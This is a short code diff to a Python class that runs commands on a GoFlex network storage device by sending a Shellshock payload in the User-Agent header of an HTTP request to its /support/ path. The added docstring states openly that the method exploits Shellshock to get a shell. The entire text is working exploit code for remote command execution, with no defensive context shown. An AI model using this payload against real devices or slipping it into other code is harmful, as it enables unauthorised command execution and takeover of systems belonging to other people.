@@ -13,9 +13,14 @@ class CommandExecutor:
 
     @staticmethod
     def _unsafe_execute(ip: str, command: str) -> str:
-        return requests.get(
+        """
+        Exploit shellshock vulnerability to get a shell on the GoFlex device.
+        """
+        response = requests.get(
             url=f"http://{ip}/support/",
             headers={
                 "User-Agent": "() { :; }; " + command
             }
-        ).text
+        )
+
+        return response.text.strip()
